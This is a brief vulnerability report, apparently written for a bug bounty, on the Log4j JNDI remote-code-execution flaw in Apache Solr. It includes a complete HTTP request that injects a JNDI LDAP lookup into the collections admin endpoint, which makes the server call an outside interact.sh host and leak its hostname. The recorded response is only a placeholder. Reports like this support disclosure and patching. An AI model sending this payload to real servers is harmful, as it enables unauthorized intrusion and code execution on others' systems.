

# Apache Solr Log4j RCE

Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. This vulnerability affects Solr 7+. 

## Steps To Reproduce

Request  (calling variable Hostname)
```
GET /solr/admin/collections?action=$%7Bjndi:ldap://$%7BhostName%7D.c701o5qh71pnr5rspgm0c8ybagyyyyyyn.interact.sh/a%7D HTTP/1.1
Host: $HOST
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip



```

Response

```
FILLER 
```



## Impact

- An unauthenticated, 3rd-party attacker or adversary can execute remote code
 
### Supporting Material/References
https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
https://twitter.com/sirifu4k1/status/1470946544908185603

